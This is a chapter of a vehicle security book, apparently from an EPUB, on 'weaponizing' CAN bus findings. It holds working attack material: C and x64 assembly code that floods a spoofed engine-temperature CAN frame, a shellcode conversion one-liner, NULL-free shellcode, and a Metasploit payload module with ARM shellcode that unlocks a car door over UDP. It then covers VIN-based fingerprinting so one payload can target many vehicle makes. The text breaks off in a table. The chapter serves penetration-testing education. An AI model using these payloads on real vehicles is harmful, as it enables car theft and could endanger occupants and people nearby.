<html><head></head><body>
<h2 class="h2" id="ch11"><span epub:type="pagebreak" id="page_193"/><strong><span class="big">11</span></strong><br/><strong>WEAPONIZING CAN FINDINGS</strong></h2>&#13;
<div class="image1"><img src="graphics/common-01.jpg" alt="image"/></div>&#13;
<p class="noindent">Now that you’re able to explore and identify CAN packets, it’s time to put that knowledge to use and learn to hack something. You’ve already used your identified packets to perform actions on a car, but unlocking or starting a car using packets is recon, rather than actual hacking. The goal of this chapter is to show you how to weaponize your findings. In the software world, <em>weaponize</em> means “take an exploit and make it easy to execute.” When you first find a vulnerability, it may take many steps and specific knowledge to successfully pull off the exploit. Weaponizing a finding enables you to take your research and put it into a self-contained executable.</p>&#13;
<p class="indent">In this chapter, we’ll see how to take an action—for example, unlocking a car—and put it into Metasploit, a security auditing tool designed to exploit software. Metasploit is a popular attack framework often used in penetration testing. It has a large database of functional exploits and <em>payloads</em>, the code that runs once a system has been exploited—for example, <span epub:type="pagebreak" id="page_194"/>once the car has been unlocked. You’ll find a wealth of information on Metasploit online and in print, including <em>Metasploit: The Penetration Tester’s Guide</em> (No Starch Press, 2011).</p>&#13;
<p class="indent">In order to weaponize your findings you <em>will</em> need to write code. In this chapter, we’ll write a Metasploit payload designed to target the architecture of the infotainment or telematics system. As our first exercise, we’ll write <em>shellcode</em>, the small snippet of code that’s injected into an exploit, to create a CAN signal that will control a vehicle’s temperature gauge. We’ll include a loop to make sure our spoofed CAN signal is continuously sent, with a builtin delay to prevent the bus from being flooded with packets that might create an inadvertent denial-of-service attack. Next, we’ll write the code to control the temperature gauge. Then, we’ll convert that code into shellcode so that we can fine-tune it to make the shellcode smaller or reduce NULL values if necessary. When we’re finished, we’ll have a payload that we can place into a specialized tool or use with an attack framework like Metasploit.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">NOTE</span></strong></p>&#13;
<p class="notep"><em>To get the most out of this chapter, you’ll need to have a good understanding of programming and programming methodologies. I assume some familiarity with C and assembly languages, both x86 and ARM, and the Metasploit framework.</em></p>&#13;
</div>&#13;
<h3 class="h3" id="ch11lev1sec1"><strong>Writing the Exploit in C</strong></h3>&#13;
<p class="noindent">We’ll write the exploit for this spoofed CAN signal in C because C compiles to fairly clean assembly that we can reference to make our shellcode. We’ll use vcan0, a virtual CAN device, to test the exploit, but for the real exploit, you’d want to instead use can0 or the actual CAN bus device that you’re targeting. <a href="ch11.html#ch11list1">Listing 11-1</a> shows the <em>temp_shell</em> exploit.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">NOTE</span></strong></p>&#13;
<p class="notep"><em>You’ll need to create a virtual CAN device in order to test this program. See <a href="ch03.html#ch03">Chapter 3</a> for details.</em></p>&#13;
</div>&#13;
<p class="indent">In <a href="ch11.html#ch11list1">Listing 11-1</a>, we create a CAN packet with an arbitration ID of 0x510 and set the second byte to 0xFF. The second byte of the 0x510 packet represents the engine temperature. By setting this value to 0xFF, we max out the reported engine temperature, signaling that the vehicle is overheating. The packet needs to be sent repeatedly to be effective.</p>&#13;
<p class="programs">--- temp_shell.c<br/> #include &lt;sys/types.h&gt;<br/> #include &lt;sys/socket.h&gt;<br/> #include &lt;sys/ioctl.h&gt;<br/> #include &lt;net/if.h&gt;<br/> #include &lt;netinet/in.h&gt;<br/> #include &lt;linux/can.h&gt;<br/> #include &lt;string.h&gt;<br/><br/> int main(int argc, char *argv[]) {<br/>     int s;<br/>     struct sockaddr_can addr;<br/><br/>     struct ifreq ifr;<br/>     struct can_frame frame;<br/><br/>     s = socket(<span class="ent">➊</span>PF_CAN, SOCK_RAW, CAN_RAW);<br/><br/>     strcpy(ifr.ifr_name, <span class="ent">➋</span>"vcan0");<br/>     ioctl(s, SIOCGIFINDEX, &amp;ifr);<br/><br/>     addr.can_family = AF_CAN;<br/>     addr.can_ifindex = ifr.ifr_ifindex;<br/><br/>     bind(s, (struct sockaddr *)&amp;addr, sizeof(addr));<br/><br/><span class="ent">➌</span>    frame.can_id = 0x510;<br/>     frame.can_dlc = 8;<br/>     frame.data[1] = 0xFF;<br/>     while(1) {<br/>       write(s, &amp;frame, sizeof(struct can_frame));<br/><span class="ent">➍</span>      usleep(500000);<br/>     }<br/> }</p>&#13;
<p class="list-caption"><a id="ch11list1"/><em>Listing 11-1: C loop to spam CAN ID 0x510</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_195"/><a href="ch11.html#ch11list1">Listing 11-1</a> sets up a socket in almost the same way as you’d set up a normal networking socket, except it uses the CAN family <span class="literal">PF_CAN</span> <span class="ent">➊</span>. We use <span class="literal">ifr_name</span> to define which interface we want to listen on—in this case, <span class="literal">"vcan0"</span> <span class="ent">➋</span>.</p>&#13;
<p class="indent">We can set up our frame using a simple frame structure that matches our packet, with <span class="literal">can_id</span> <span class="ent">➌</span> containing the arbitration ID, <span class="literal">can_dlc</span> containing the packet length, and the <span class="literal">data[]</span> array holding the packet contents.</p>&#13;
<p class="indent">We want to send this packet more than once, so we set up a <span class="literal">while</span> loop and set a sleep timer <span class="ent">➍</span> to send the packet at regular intervals. (Without the <span class="literal">sleep</span> statement, you’d flood the bus and other signals wouldn’t be able to talk properly.)</p>&#13;
<p class="indent">To confirm that this code works, compile it as shown here:</p>&#13;
<p class="programs">$ <span class="codestrong">gcc -o temp_shellcode temp_shellcode.c</span><br/>$ <span class="codestrong">ls -l temp_shell</span><br/>-rwxrwxr-x 1 craig craig 8722 Jan 6 07:39 temp_shell<br/>$ <span class="codestrong">./temp_shellcode</span></p>&#13;
<p class="indent">Now run <span class="literal">candump</span> in a separate window on vcan0, as shown in the next listing. The <em>temp_shellcode</em> program should send the necessary CAN packets to control the temperate gauge.</p>&#13;
<p class="programs">$ <span class="codestrong">candump vcan0</span><br/>  vcan0  <span class="ent">➊</span>510   [8]   <span class="ent">➋</span>5D  <span class="ent">➌</span>FF  <span class="ent">➍</span>40 00 00 00 00 00<br/>  vcan0   510   [8]    5D   FF    40 00 00 00 00 00<br/>  vcan0   510   [8]    5D   FF    40 00 00 00 00 00<br/>  vcan0   510   [8]    5D   FF    40 00 00 00 00 00</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_196"/>The <span class="literal">candump</span> results show that the signal 0x510 <span class="ent">➊</span> is repeatedly broadcast and that the second byte is properly set to 0xFF <span class="ent">➌</span>. Notice that the other values of the CAN packet are set to values that we didn’t specify, such as 0x5D <span class="ent">➋</span> and 0x40 <span class="ent">➍</span>. This is because we didn’t initialize the <em>frame.data</em> section, and there is some memory garbage in the other bytes of the signal. To get rid of this memory garbage, set the other bytes of the 0x510 signal to the values you recorded during testing when you identified the signal—that is, set the other bytes to <span class="literal">frame.data[]</span>.</p>&#13;
<h4 class="h4" id="ch11lev2sec1"><strong><em>Converting to Assembly Code</em></strong></h4>&#13;
<p class="noindent">Though our <em>temp_shell</em> program is small, it’s still almost 9KB because we wrote it in C, which includes a bunch of other libraries and code stubs that increase the size of the program. We want our shellcode to be as small as possible because we’ll often have only a small area of memory available for our exploit to run, and the smaller our shellcode, the more places it can be injected.</p>&#13;
<p class="indent">In order to shrink the size of our program, we’ll convert its C code to assembly and then convert the assembly shellcode. If you’re already familiar with assembly language, you could just write your code in assembly to begin with, but most people find it easier to test their payloads in C first.</p>&#13;
<p class="indent">The only difference between writing this script and standard assembly scripts is that you’ll need to avoid creating NULLs, as you may want to inject the shellcode into a buffer that might null-terminate. For example, buffers that are treated as strings will scan the values and stop when it see a NULL value. If your payload has a NULL in the middle, your code won’t work. (If you know that your payload will never be used in a buffer that will be interpreted as a string, then you can skip this step.)</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">NOTE</span></strong></p>&#13;
<p class="notep"><em>Alternatively, you could wrap your payload with an encoder to hide any NULLs, but doing so will increase its size, and using encoders is beyond the scope of this chapter. You also won’t have a data section to hold all of your string and constant values as you would in a standard program. We want our code to be self-sufficient and we don’t want to rely on the ELF header to set up any values for us, so if we want to use strings in our payload, we have to be creative in how we place them on the stack.</em></p>&#13;
</div>&#13;
<p class="indent">In order to convert the C code to assembly, you will need to review the system header files. All method calls go right to the kernel, and you can see them all in this header file:</p>&#13;
<p class="programs">/usr/include/asm/unistd_64.h</p>&#13;
<p class="indent">For this example, we’ll use 64-bit assembly, which uses the following registers: <span class="literal">%rax</span>, <span class="literal">%rbx</span>, <span class="literal">%rcx</span>, <span class="literal">%rdx</span>, <span class="literal">%rsi</span>, <span class="literal">%rdi</span>, <span class="literal">%rbp</span>, <span class="literal">%rsp</span>, <span class="literal">%r8</span>, <span class="literal">%r15</span>, <span class="literal">%rip</span>, <span class="literal">%eflags</span>, <span class="literal">%cs</span>, <span class="literal">%ss</span>, <span class="literal">%ds</span>, <span class="literal">%es</span>, <span class="literal">%fs</span>, and <span class="literal">%gs</span>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_197"/>To call a kernel system call, use <span class="literal">syscall</span>—rather than <span class="literal">int 0x80</span>—where <span class="literal">%rax</span> has the system call number, which you can find in <em>unistd_64.h</em>. The parameters are passed in the registers in this order: <span class="literal">%rdi</span>, <span class="literal">%rsi</span>, <span class="literal">%rdx</span>, <span class="literal">%r10</span>, <span class="literal">%r8</span>, and <span class="literal">%r9</span>.</p>&#13;
<p class="indent">Note that the register order is slightly different than when passing arguments to a function.</p>&#13;
<p class="indent"><a href="ch11.html#ch11list2">Listing 11-2</a> shows the resulting assembly code that we store in the <em>temp_shell.s</em> file.</p>&#13;
<p class="programs">--- temp_shell.S<br/>section .text<br/>global _start<br/><br/>_start:<br/>                             ; s = socket(PF_CAN, SOCK_RAW, CAN_RAW);<br/>  push 41                    ; Socket syscall from unistd_64.h<br/>  pop rax<br/>  push 29                    ; PF_CAN from socket.h<br/>  pop rdi<br/>  push 3                     ; SOCK_RAW from socket_type.h<br/>  pop rsi<br/>  push 1                     ; CAN_RAW from can.h<br/>  pop rdx<br/>  syscall<br/>  mov r8, rax                ; s / File descriptor from socket<br/>                             ; strcpy(ifr.ifr_name, "vcan0");<br/>  sub rsp, 40                ;  struct ifreq is 40 bytes<br/>  xor r9, r9                 ; temp register to hold interface name<br/>  mov r9, 0x306e616376       ; vcan0<br/>  push r9<br/>  pop qword [rsp]<br/>                             ; ioctl(s, SIOCGIFINDEX, &amp;ifr);<br/>  push 16                    ; ioctrl from unistd_64.h<br/>  pop rax<br/>  mov rdi, r8                ; s / File descriptor<br/>  push 0x8933                ; SIOCGIFINDEX from ioctls.h<br/>  pop rsi<br/>  mov rdx, rsp               ; &amp;ifr<br/>  syscall<br/>  xor r9, r9                 ; clear r9<br/>  mov r9, [rsp+16]           ; ifr.ifr_ifindex<br/>                             ; addr.can_family = AF_CAN;<br/>  sub rsp, 16                ; sizeof sockaddr_can<br/>  mov word [rsp], 29         ; AF_CAN == PF_CAN<br/>                             ; addr.can_ifindex = ifr.ifr_ifindex;<br/>  mov [rsp+4], r9<br/>                             ; bind(s, (struct sockaddr *)&amp;addr,<br/>sizeof(addr));<br/>  push 49                    ; bind from unistd_64.h<br/>  pop rax<br/>  mov rdi, r8                ; s /File descriptor<br/>  mov rsi, rsp               ; &amp;addr<br/>  mov rdx, 16                ; sizeof(addr)<br/>  syscall<br/>  sub rsp, 16                ; sizeof can_frame<br/>  mov word [rsp], 0x510      ; frame.can_id = 0x510;<br/><br/>  mov byte [rsp+4], 8        ;  frame.can_dlc = 8;<br/><br/>  mov byte [rsp+9], 0xFF     ;  frame.data[1] = 0xFF;<br/>                             ; while(1)<br/>loop:<br/>                             ; write(s, &amp;frame, sizeof(struct can_frame));<br/>  push 1                     ; write from unistd_64.h<br/>  pop rax<br/>  mov rdi, r8                ; s / File descriptor<br/>  mov rsi, rsp               ; &amp;frame<br/>  mov rdx, 16                ; sizeof can_frame<br/>  syscall<br/>                             ; usleep(500000);<br/>  push 35                    ; nanosleep from unistd_64.h<br/>  pop rax<br/>  sub rsp, 16<br/>  xor rsi, rsi<br/>  mov [rsp], rsi             ; tv_sec<br/>  mov dword [rsp+8], 500000  ; tv_nsec<br/>  mov rdi, rsp<br/>  syscall<br/>  add rsp, 16<br/>  jmp loop</p>&#13;
<p class="list-caption"><a id="ch11list2"/><em>Listing 11-2: Sending CAN ID 0x510 packets in 64-bit assembly</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_198"/>The code in <a href="ch11.html#ch11list2">Listing 11-2</a> is exactly the same as the C code we wrote in <a href="ch11.html#ch11list1">Listing 11-1</a>, except that it’s now written in 64-bit assembly.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">NOTE</span></strong></p>&#13;
<p class="notep"><em>I’ve commented the code to show the relationship between the lines of the original C code and each chunk of assembly code.</em></p>&#13;
</div>&#13;
<p class="indent">To compile and link the program to make it an executable, use <span class="literal">nasm</span> and <span class="literal">ld</span>, as shown here:</p>&#13;
<p class="programs">$ <span class="codestrong">nasm -f elf64 -o temp_shell2.o temp_shell.S</span><br/>$ <span class="codestrong">ld -o temp_shell2 temp_shell2.o</span><br/>$ <span class="codestrong">ls -l temp_shell2</span><br/>-rwxrwxr-x 1 craig craig <span class="ent">➊</span>1008 Jan  6 11:32 temp_shell2</p>&#13;
<p class="indent">The size of the object header now shows that the program is around 1008 bytes <span class="ent">➊</span>, or just over 1KB, which is significantly smaller than the compiled C program. Once we strip the ELF header caused by the linking step (<span class="literal">ld</span>), our code will be even smaller still.</p>&#13;
<h4 class="h4" id="ch11lev2sec2"><span epub:type="pagebreak" id="page_199"/><strong><em>Converting Assembly to Shellcode</em></strong></h4>&#13;
<p class="noindent">Now that your program is of more suitable size, you can use one line of Bash to convert your object file to shellcode right at the command line, as shown in <a href="ch11.html#ch11list3">Listing 11-3</a>.</p>&#13;
<p class="programs">$ <span class="codestrong">for i in $(objdump -d temp_shell2.o -M intel |grep "^ " |cut -f2); do echo</span><br/><span class="codestrong">-n '\x'$i; done;echo</span><br/>\x6a\x29\x58\x6a\x1d\x5f\x6a\x03\x5e\x6a\x01\x5a\x0f\x05\x49\x89\xc0\x48\x83\<br/>xec\x28\x4d\x31\xc9\x49\xb9\x76\x63\x61\x6e\x30\x00\x00\x00\x41\x51\x8f\x04\<br/>x24\x6a\x10\x58\x4c\x89\xc7\x68\x33\x89\x00\x00\x5e\x48\x89\xe2\x0f\x05\x4d\<br/>x31\xc9\x4c\x8b\x4c\x24\x10\x48\x83\xec\x10\x66\xc7\x04\x24\x1d\x00\x4c\x89\<br/>x4c\x24\x04\x6a\x31\x58\x4c\x89\xc7\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\<br/>x48\x83\xec\x10\x66\xc7\x04\x24\x10\x05\xc6\x44\x24\x04\x08\xc6\x44\x24\x09\<br/>xff\x6a\x01\x58\x4c\x89\xc7\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\x6a\x23\<br/>x58\x48\x83\xec\x10\x48\x31\xf6\x48\x89\x34\x24\xc7\x44\x24\x08\x20\xa1\x07\<br/>x00\x48\x89\xe7\x0f\x05\x48\x83\xc4\x10\xeb\xcf</p>&#13;
<p class="list-caption"><a id="ch11list3"/><em>Listing 11-3: Converting object file to shellcode</em></p>&#13;
<p class="indent">This series of commands runs through your compiled object file and pulls out the hex bytes that make up the program, printing them to the screen. The bytes output is your shellcode. If you count up the printed bytes, you can see that this shellcode is 168 bytes—that’s more like it.</p>&#13;
<h4 class="h4" id="ch11lev2sec3"><strong><em>Removing NULLs</em></strong></h4>&#13;
<p class="noindent">But we’re not done yet. If you look at the shellcode in <a href="ch11.html#ch11list3">Listing 11-3</a>, you’ll notice that we still have some NULL values (<span class="literal">\x00</span>) that we need to eliminate. One way to do so is to use a loader, which Metasploit has, to wrap the bytes or rewrite parts of the code to eliminate the NULLs.</p>&#13;
<p class="indent">You could also rewrite your assembly to remove NULLs from the final assembly, typically by replacing MOVs and values that would have NULLs in them with a command to erase a register and another command to add the appropriate value. For instance, a command like <span class="literal">MOV RDI, 0x03</span> will convert to hex that has a lot of leading NULLs before the 3. To get around this, you could first XOR RDI to itself (<span class="literal">XOR RDI, RDI</span>), which would result in RDI being a NULL, and then increase RDI (<span class="literal">INC RDI</span>) three times. You may have to be creative in some spots.</p>&#13;
<p class="indent">Once you’ve made the modifications to remove these NULL values, you can convert the shellcode to code that can be embedded in a string buffer. I won’t show the altered assembly code because it’s not very legible, but the new shellcode looks like this:</p>&#13;
<p class="programs">\x6a\x29\x58\x6a\x1d\x5f\x6a\x03\x5e\x6a\x01\x5a\x0f\x05\x49\x89\xc0\x48\x83\<br/>xec\x28\x4d\x31\xc9\x41\xb9\x30\x00\x00\x00\x49\xc1\xe1\x20\x49\x81\xc1\x76\<br/>x63\x61\x6e\x41\x51\x8f\x04\x24\x6a\x10\x58\x4c\x89\xc7\x41\xb9\x11\x11\x33\<br/>x89\x49\xc1\xe9\x10\x41\x51\x5e\x48\x89\xe2\x0f\x05\x4d\x31\xc9\x4c\x8b\x4c\<br/>x24\x10\x48\x83\xec\x10\xc6\x04\x24\x1d\x4c\x89\x4c\x24\x04\x6a\x31\x58\x4c\<br/>x89\xc7\x48\x89\xe6\xba\x11\x11\x11\x10\x48\xc1\xea\x18\x0f\x05\x48\x83\xec\<br/>x10\x66\xc7\x04\x24\x10\x05\xc6\x44\x24\x04\x08\xc6\x44\x24\x09\xff\x6a\x01\<br/>x58\x4c\x89\xc7\x48\x89\xe6\x0f\x05\x6a\x23\x58\x48\x83\xec\x10\x48\x31\xf6\<br/>x48\x89\x34\x24\xc7\x44\x24\x08\x00\x65\xcd\x1d\x48\x89\xe7\x0f\x05\x48\x83\<br/>xc4\x10\xeb\xd4</p>&#13;
<h4 class="h4" id="ch11lev2sec4"><span epub:type="pagebreak" id="page_200"/><strong><em>Creating a Metasploit Payload</em></strong></h4>&#13;
<p class="noindent"><a href="ch11.html#ch11list4">Listing 11-4</a> is a template for a Metasploit payload that uses our shellcode. Save this payload in <em>modules/payloads/singles/linux/armle/</em>, and name it something similar to the action that you’ll be performing, like <em>flood_temp.rb</em>. The example payload in <a href="ch11.html#ch11list4">Listing 11-4</a> is designed for an infotainment system on ARM Linux with an Ethernet bus. Instead of modifying temperature, this shellcode unlocks the car doors. The following code is a standard payload structure, other than the payload variable that we set to the desired vehicle shellcode.</p>&#13;
<p class="programs">   Require 'msf/core'<br/><br/>   module Metasploit3<br/>      include Msf::Payload::Single<br/>      include Msf::Payload::Linux<br/><br/>     def initialize(info = {})<br/>       super(merge_info(info,<br/>         'Name'          =&gt; 'Unlock Car',<br/>         'Description'   =&gt; 'Unlocks the Driver Car Door over Ethernet',<br/>         'Author'        =&gt; 'Craig Smith',<br/>         'License'       =&gt; MSF_LICENSE,<br/>         'Platform'      =&gt; 'linux',<br/>         'Arch'          =&gt; ARCH_ARMLE))<br/>      end<br/>      def generate_stage(opts={})<br/><br/><span class="ent">➊</span>      payload = "\x02\x00\xa0\xe3\x02\x10\xa0\xe3\x11\x20\xa0\xe3\x07\x00\x2d\<br/>   xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\<br/>   xa0\xe1\x21\x13\xa0\xe3\x4e\x18\x81\xe2\x02\x10\x81\xe2\xff\x24\xa0\xe3\x45\<br/>   x28\x82\xe2\x2a\x2b\x82\xe2\xc0\x20\x82\xe2\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\<br/>   x10\x20\xa0\xe3\x07\x00\x2d\xe9\x03\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\<br/>   xef\x14\xd0\x8d\xe2\x12\x13\xa0\xe3\x02\x18\x81\xe2\x02\x28\xa0\xe3\x00\x30\<br/>   xa0\xe3\x0e\x00\x2d\xe9\x0d\x10\xa0\xe1\x0c\x20\xa0\xe3\x06\x00\xa0\xe1\x07\<br/>   x00\x2d\xe9\x09\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\<br/>   x00\x00\xa0\xe3\x1e\xff\x2f\xe1"<br/>      end<br/>   end</p>&#13;
<p class="list-caption"><a id="ch11list4"/><em>Listing 11-4: Template for Metasploit payload using our shellcode</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_201"/>The <span class="literal">payload</span> variable <span class="ent">➊</span> in <a href="ch11.html#ch11list4">Listing 11-4</a> translates to the following ARM assembly code:</p>&#13;
<p class="programs">      /* Grab a socket handler for UDP */<br/>      mov     %r0, $2 /* AF_INET */<br/>      mov     %r1, $2 /* SOCK_DRAM */<br/>      mov     %r2, $17        /* UDP */<br/>      push    {%r0, %r1, %r2}<br/>      mov     %r0, $1 /* socket */<br/>      mov     %r1, %sp<br/>      svc     0x00900066<br/>      add     %sp, %sp, $12<br/><br/>      /* Save socket handler to %r6 */<br/>      mov     %r6, %r0<br/><br/>      /* Connect to socket */<br/>      mov     %r1, $0x84000000<br/>      add     %r1, $0x4e0000<br/>      add     %r1, $2         /* 20100 &amp; AF_INET */<br/>      mov     %r2, $0xff000000<br/>      add     %r2, $0x450000<br/>      add     %r2, $0xa800<br/>      add     %r2, $0xc0 /* 192.168.69.255 */<br/>      push    {%r1, %r2}<br/>      mov     %r1, %sp<br/>      mov     %r2, $16        /* sizeof socketaddr_in */<br/>      push    {%r0, %r1, %r2}<br/>      mov     %r0, $3 /* connect */<br/>      mov     %r1, %sp<br/>      svc     0x00900066<br/>      add     %sp, %sp, $20<br/><br/>      /* CAN Packet */<br/>      /* 0000 0248 0000 0200 0000 0000 */<br/>      mov     %r1, $0x48000000  /* Signal */<br/>      add     %r1, $0x020000<br/>      mov     %r2, $0x00020000  /* 1st 4 bytes */<br/>      mov     %r3, $0x00000000  /* 2nd 4 bytes */<br/>      push    {%r1, %r2, %r3}<br/>      mov     %r1, %sp<br/>      mov     %r2, $12        /* size of pkt */<br/><br/>      /* Send CAN Packet over UDP */<br/>      mov     %r0, %r6<br/>      push    {%r0, %r1, %r2}<br/>      mov     %r0, $9 /* send */<br/>      mov     %r1, %sp<br/>      svc     0x00900066<br/>      add     %sp, %sp, $12<br/><br/>      /* Return from main - Only for testing, remove for exploit */<br/>      mov     %r0, $0<br/>      bx      lr</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_202"/>This code is similar to the shellcode we created in <a href="ch11.html#ch11list3">Listing 11-3</a>, except that it’s built for ARM rather than x64 Intel, and it functions over Ethernet instead of talking directly to the CAN drivers. Of course, if the infotainment center uses a CAN driver rather than an Ethernet driver, you need to write to the CAN driver instead of the network.</p>&#13;
<p class="indent">Once you have a payload ready, you can add it to the arsenal of existing Metasploit exploits for use against a vehicle’s infotainment center. Because Metasploit parses the payload file, you can simply choose it as an option to use against any target infotainment unit. If a vulnerability is found, the payload will run and perform the action of the packet you mimicked, such as unlocking the doors, starting the car, and so on.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">NOTE</span></strong></p>&#13;
<p class="notep"><em>You could write your weaponizing program in assembly and use it as your exploit rather than going through Metasploit, but I recommend using Metasploit. It has a large collection of vehicle-based payloads and exploits available, so it’s worth the extra time it takes to convert your code.</em></p>&#13;
</div>&#13;
<h3 class="h3" id="ch11lev1sec2"><strong>Determining Your Target Make</strong></h3>&#13;
<p class="noindent">So far you’ve located a vulnerability in an infotainment unit and you have the CAN bus packet payload ready to go. If your intention was to perform a security engagement on just one type of vehicle, you’re good to go. But if you intend to use your payload on all vehicles with a particular infotainment or telematics system installed, you have a bit more to do; these systems are installed by various manufacturers and CAN bus networks vary between manufacturers and even between models.</p>&#13;
<p class="indent">In order to use this exploit against more than one type of vehicle, you’ll need to detect the make of the vehicle that your shellcode is executing on before transmitting packets.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">WARNING</span></strong></p>&#13;
<p class="notep"><em>Failure to detect the make of the vehicle could produce unexpected results and could be very dangerous! For example, a packet that on one make of vehicle unlocks the car door could bleed the brakes on another. There’s no way to know for sure where your exploit will run, so be sure to verify the vehicle.</em></p>&#13;
</div>&#13;
<p class="indent">Determining the make of vehicle is analogous to determining which OS version the target host is running, as we did in “<a href="ch09.html#ch09lev2sec2">Determining the Update File Type</a>” on <a href="ch09.html#page_160">page 160</a>. You may be able to find this information in the memory space of the infotainment unit by adding the ability to scan RAM in your shellcode. Otherwise, there are two ways to determine what type of vehicle your code is running on via the CAN bus: interactive probing and passive CAN bus fingerprinting.</p>&#13;
<h4 class="h4" id="ch11lev2sec5"><span epub:type="pagebreak" id="page_203"/><strong><em>Interactive Probing</em></strong></h4>&#13;
<p class="noindent">The interactive probing method involves using the ISO-TP packets to query the PID that holds the VIN. If we can access the VIN and decipher the code, it’ll tell us the make and model of the target vehicle.</p>&#13;
<h5 class="h5" id="ch11lev3sec1"><strong>Querying the VIN</strong></h5>&#13;
<p class="noindent">Recall from “<a href="ch04.html#ch04lev2sec4">Sending Data with ISO-TP and CAN</a>” on <a href="ch04.html#page_55">page 55</a> that you use the OBD-II Mode 2 PID 9 protocol to query the VIN. This protocol uses the ISO-TP multipacket standard, which can be cumbersome to implement in shellcode. You can, however, just take what you need from the ISO-TP standard rather than implementing it in full. For example, because ISO-TP runs as normal CAN traffic, you could send a packet with your shellcode using an ID of 0x7DF and a 3-byte packet payload of 0x02 0x09 0x02; then you could receive normal CAN traffic with an ID 0x7E8. The first packet received will be part of a multipart packet followed by the remaining packets. The first packet has the most significant information in it and may be all you need to differentiate between vehicles.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">NOTE</span></strong></p>&#13;
<p class="notep"><em>You could assemble the multipart packet yourself and then implement a full VIN decoder, but doing so can be inefficient. Regardless of whether you reassemble the full VIN or just use a segment of the VIN, it’s better to decode the VIN yourself.</em></p>&#13;
</div>&#13;
<h5 class="h5" id="ch11lev3sec2"><strong>Decoding the VIN</strong></h5>&#13;
<p class="noindent">The VIN has a fairly simple layout. The first three characters, known as the <em>World Manufacturer Identifier (WMI) code</em>, represent the make of the vehicle. The first character in the WMI code determines the region of manufacture. The next two characters are manufacturer specific. (The list is too long to print here, but you can find a list of WMI codes with a simple online search.) For example, in <a href="ch04.html#ch04">Chapter 4</a> (see <a href="ch04.html#ch4tab4">Table 4-4</a> on <a href="ch04.html#page_57">page 57</a>) we had a VIN of 1G1ZT53826F109149, which gave us a WMI of 1G1. According to the WMI codes, this tells us that the make of the car is Chevrolet.</p>&#13;
<p class="indent">The next 6 bytes of the VIN make up the <em>Vehicle Descriptor Section (VDS)</em>. The first 2 bytes in the VDS—bytes 4 and 5 of the VIN—tell us the vehicle model and other specs, such as how many doors the vehicle has, the engine size, and so on. For example, in the VIN 1G1ZT53826F109149, the VDS is ZT5382, of which <em>ZT</em> gives us the model. A quick search online tells us that this is a Chevrolet Malibu. (The details of the VDS vary depending on the vehicle and the manufacturer.)</p>&#13;
<p class="indent">If you need the year your vehicle was made, you’ll have to grab more packets because the year is stored at byte 10. This byte isn’t directly translatable, and you’ll need to use a table to determine the year (see <a href="ch11.html#ch11tab1">Table 11-1</a>).</p>&#13;
<p class="tabcaption"><span epub:type="pagebreak" id="page_204"/><a id="ch11tab1"/><strong>Table 11-1:</strong> Determining the Year of Manufacture</p>&#13;
<table class="topbot">&#13;
<colgroup>&#13;
<col style="width: 14%;"/>&#13;
<col style="width: 11%;"/>&#13;
<col style="width: 14%;"/>&#13;
<col style="width: 11%;"/>&#13;
<col style="width: 14%;"/>&#13;
<col style="width: 11%;"/>&#13;
<col style="width: 14%;"/>&#13;
<col style="width: 11%;"/>&#13;
</colgroup>&#13;
<thead>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table_th"><p class="table"><strong>Character</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_th"><p class="table"><strong>Year</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_tha"><p class="table"><strong>Character</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_tha"><p class="table"><strong>Year</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_th"><p class="table"><strong>Character</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_th"><p class="table"><strong>Year</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_tha"><p class="table"><strong>Character</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_tha"><p class="table"><strong>Year</strong></p></td>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">A</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1980</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">L</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1990</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Y</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2000</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">A</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2010</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">B</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1981</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">M</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1991</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2001</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">B</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2011</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">C</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1982</p></td>&#13;
